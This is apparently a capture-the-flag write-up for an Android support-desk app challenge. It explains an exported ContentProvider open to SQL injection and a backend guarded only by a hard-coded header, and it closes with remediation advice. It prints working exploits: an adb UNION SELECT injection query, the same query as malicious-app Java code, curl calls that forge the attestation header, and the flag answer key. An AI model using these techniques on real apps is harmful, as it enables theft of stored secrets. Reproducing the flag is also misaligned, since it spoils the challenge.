# Deskline — "Help Yourself" (Mobile)

| | |
|---|---|
| **Target** | `https://web-0129ca0487b6079e.web.h7tex.com` |
| **Artifact** | `deskline-1.6.0.apk` (`com.deskline`, v1.6.0 / versionCode 10600) |
| **Category** | Mobile |
| **Flag** | `H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}` |

## Description

> Deskline runs the support desk our agents live in all day, one ticket queue that never stops refilling. Tucked in among the customer complaints is a single note marked agent-only, and the desk is quite sure you'll never reach it.
>
> So help yourself.

## TL;DR

The app syncs its queue from a backend and stores the tickets in a local SQLite
database. Alongside the public tickets it also stores one **`internal` credential
— the agent-only note — in a separate `credentials` table that the UI never
renders**.

Two things break the challenge open:

1. **The exported `TicketProvider` is SQL-injectable.** Its authority
   `com.deskline.tickets` is exported with no permission, and the `WHERE` clause
   is concatenated straight into the query. Any co-installed app (or `adb shell
   content`) can `UNION SELECT` the private `credentials` table.
2. **The backend hands out the same note over REST.** `/api/v1/sync` returns the
   `internal` object to any client that passes a hard-coded `X-Deskline-Client`
   attestation check, so the flag is reachable without a device at all.

The note is:

```
label: vault-unseal-code
value: H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}
```

---

## 1. Recon

The root of the API advertises the service:

```console
$ curl -s https://web-0129ca0487b6079e.web.h7tex.com/
{"service":"Deskline Agent API","version":"1.6.0"}
```

The APK is a small, unobfuscated app. Decompile it:

```console
$ jadx -d jadx_out deskline-1.6.0.apk
```

Resulting classes:

```
com/deskline/MainActivity.java
com/deskline/ApiClient.java
com/deskline/Session.java
com/deskline/DeskDb.java
com/deskline/TicketProvider.java
```

### Manifest — an exported provider

```
E: provider
  A: android:name=".TicketProvider"          (Raw: ".TicketProvider")
  A: android:exported="true"
  A: android:authorities="com.deskline.tickets"
```

`android:exported="true"` with no `android:permission` means **any** app on the
device can query it.

## 2. Static analysis

### `ApiClient` — bearer-token REST client

* Base URL defaults to `http://10.0.2.2:8080` (`Session.baseUrl`), overrideable
  from the UI.
* Device auth: `POST /api/v1/auth/device` with body `{"device_id":"dsk-<uuid>"}`
  and the required header `X-Deskline-Client: Deskline-Android/1.6.0`.
* Queue sync: `GET /api/v1/sync` with `Authorization: Bearer <token>`.

### `MainActivity.sync()` — what the app pulls

```java
POST /api/v1/auth/device  ->  { "agent": "...", "token": "<JWT>" }
GET  /api/v1/sync         ->  { "internal": {...}, "tickets": [ ... ] }
new DeskDb(this).seedFromSync(resp.body);
```

Note the UI only ever iterates `tickets`:

```java
cursor = db.rawQuery("SELECT subject, body FROM tickets", null);
```

### `DeskDb.seedFromSync()` — where the secret lands

```java
db.execSQL("CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, subject TEXT, body TEXT)");
db.execSQL("CREATE TABLE credentials (id INTEGER PRIMARY KEY AUTOINCREMENT, label TEXT, value TEXT)");
...
JSONObject internal = obj.getJSONObject("internal");
values.put("label", internal.getString("label"));
values.put("value", internal.getString("value"));
db.insert("credentials", null, values);   // <-- the agent-only note
```

The public complaints go to `tickets`; the **single agent-only note goes to
`credentials`**, which the UI never touches. This is the "single note marked
agent-only" the description mentions.

### `TicketProvider` — SQL injection

```java
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = new DeskDb(getContext()).getReadableDatabase();
    String sql = "SELECT id, subject, body FROM tickets";
    if (selection != null && selection.trim().length() > 0) {
        sql = "SELECT id, subject, body FROM tickets WHERE " + selection;   // <-- injection
    }
    if (sortOrder != null && sortOrder.trim().length() > 0) {
        sql = sql + " ORDER BY " + sortOrder;                              // <-- injection
    }
    return db.rawQuery(sql, null);
}
```

`selection` (the caller-controlled `WHERE` clause) is string-concatenated. There
is no parameterisation, no table allow-list, and no permission on the provider.
Because it is a plain `UNION`-able `SELECT`, the private `credentials` table can
be projected into the ticket cursor.

## 3. Exploitation

### Option A — intended mobile path (exported ContentProvider SQLi)

With the app installed on a device/emulator, either a malicious co-installed app
or `adb` can run:

```console
$ adb shell content query \
    --uri content://com.deskline.tickets/ \
    --where "1=1 UNION SELECT 1,label,value FROM credentials"
```

The provider builds:

```sql
SELECT id, subject, body FROM tickets
WHERE 1=1 UNION SELECT 1,label,value FROM credentials
```

so the credential's `label` shows up in the `subject` column and its `value` in
the `body` column:

```
Row: 0 id=1, subject=vault-unseal-code, body=H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}
```

The equivalent from a malicious app:

```java
getContentResolver().query(
    Uri.parse("content://com.deskline.tickets/"),
    null,
    "1=1 UNION SELECT 1,label,value FROM credentials",
    null, null);
```

`solve.py --adb` wraps the `adb` variant.

### Option B — API path (used by `solve.py`)

The backend requires attestation only on device auth, and the check is just the
presence of the hard-coded header value. The token's `sub` is always `7700`
(the seeded agent *Marcus Hale*) regardless of the device id, and `/api/v1/sync`
returns `internal` to any authenticated caller:

```console
$ DEV="dsk-$(cat /proc/sys/kernel/random/uuid)"
$ TOKEN=$(curl -s -X POST https://web-0129ca0487b6079e.web.h7tex.com/api/v1/auth/device \
    -H 'Content-Type: application/json' \
    -H 'X-Deskline-Client: Deskline-Android/1.6.0' \
    -d "{\"device_id\":\"$DEV\"}" | jq -r .token)

$ curl -s https://web-0129ca0487b6079e.web.h7tex.com/api/v1/sync \
    -H "Authorization: Bearer $TOKEN"
{
  "internal": {
    "label": "vault-unseal-code",
    "value": "H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}"
  },
  "tickets": [
    { "body": "Customer locked out after 3 tries.",       "subject": "Cannot reset password" },
    { "body": "Order #55120, refund pending 8 days.",     "subject": "Refund not received" },
    { "body": "Repro: attach >10MB photo, force close.",  "subject": "App crashes on upload" },
    { "body": "Requests move to new corporate domain.",   "subject": "Change billing email" }
  ]
}
```

## 4. Automated solver

`solve.py` implements both paths (API by default, `--adb` for the provider):

```console
$ python3 solve.py
[*] target: https://web-0129ca0487b6079e.web.h7tex.com
[*] auth/device -> HTTP 200 (device_id=dsk-...)
[*] authenticated as agent: Marcus Hale
[*] /api/v1/sync -> HTTP 200

[*] Ticket queue (what the UI shows):
    - Cannot reset password: Customer locked out after 3 tries.
    - Refund not received: Order #55120, refund pending 8 days.
    - App crashes on upload: Repro: attach >10MB photo, force close.
    - Change billing email: Requests move to new corporate domain.

[+] Agent-only note (vault-unseal-code):
    H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}

[=] FLAG: H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}
```

Other invocations:

```console
python3 solve.py --adb                       # exploit TicketProvider via adb
python3 solve.py --url http://10.0.2.2:8080  # point at a local/other instance
```

## 5. Flag

```
H7CTF{74a6446d-7a6c-4c2d-b6c9-aba79f13a08d}
```

## 6. Root cause & remediation

**Findings**

1. **Exported ContentProvider without permission** — `TicketProvider` is
   `exported="true"` and unguarded, exposing the app's database to every app on
   the device.
2. **SQL injection** — the `selection` and `sortOrder` arguments are concatenated
   into the SQL string, allowing `UNION`/subquery reads of arbitrary tables
   (`credentials`, `sqlite_master`, …).
3. **Sensitive data stored client-side in plaintext** — the "agent-only" secret
   is persisted in `credentials.value` without encryption.
4. **Weak backend attestation** — a hard-coded, publicly-known header value is
   the only client check; device identity is not bound to the token, and the
   `internal` secret is returned to every device. All new devices are silently
   mapped to agent `7700`.

**Fixes**

* Set `android:exported="false"` (or require a signature-level
  `android:permission`) and validate the caller.
* Never build SQL from caller input — use `selectionArgs` placeholders
  (`"subject = ?"`) and a whitelist for `sortOrder`.
* Encrypt secrets at rest (Android Keystore / EncryptedSharedPreferences) and do
  not ship agent-only data to non-agent clients.
* Replace static header attestation with a real, per-device credential; bind the
  token `sub` to the authenticated device; authorise access to the `internal`
  note server-side rather than relying on the UI to hide it.
